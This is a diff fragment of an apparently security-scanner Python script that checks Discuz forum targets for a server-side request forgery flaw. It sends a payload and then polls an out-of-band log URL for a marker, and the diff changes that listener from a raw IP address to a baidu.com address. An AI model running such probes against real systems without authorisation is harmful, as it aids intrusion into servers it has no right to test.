@@ -29,7 +29,7 @@ class discuz_forum_message_ssrf_BaseVerify:
         vulnurl = self.url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
-            eye_url = "http://45.76.158.91/web.log"
+            eye_url = "http://www.baidu.com/web.log"
             time.sleep(6)
             reqr = requests.get(eye_url, timeout=10, verify=False)
             if md5_str in reqr.text:
